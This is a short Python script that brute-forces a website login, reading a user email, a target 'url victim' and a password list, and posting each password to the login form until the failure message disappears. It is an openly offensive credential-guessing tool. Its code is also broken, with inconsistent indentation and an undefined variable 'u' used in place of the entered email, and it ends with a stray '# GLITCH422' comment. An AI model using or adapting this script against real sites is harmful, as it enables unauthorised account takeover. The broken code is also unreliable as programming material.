import requests
url = input('Please enter your url victim:\t')
email = input('Please enter the user:\t')
password = input('Please enter the password list (name of the file or path):\t')
with open(password, 'r') as passlist:
  for p in passlist:
  p = ''.join(p.split("\n"))
  data_payload = {
    'email': u,
    'password': p,
    'RememberMe': 'false'
 }
 site = requests.post(f'{url}', data=data_payload)
 text = site.text
 if "The email or password provided is incorrect" in text:
     print(f'Login failed: {u} {p}')
 else:
     print(f'The login is success: {u} {p}')
                    
   # GLITCH422

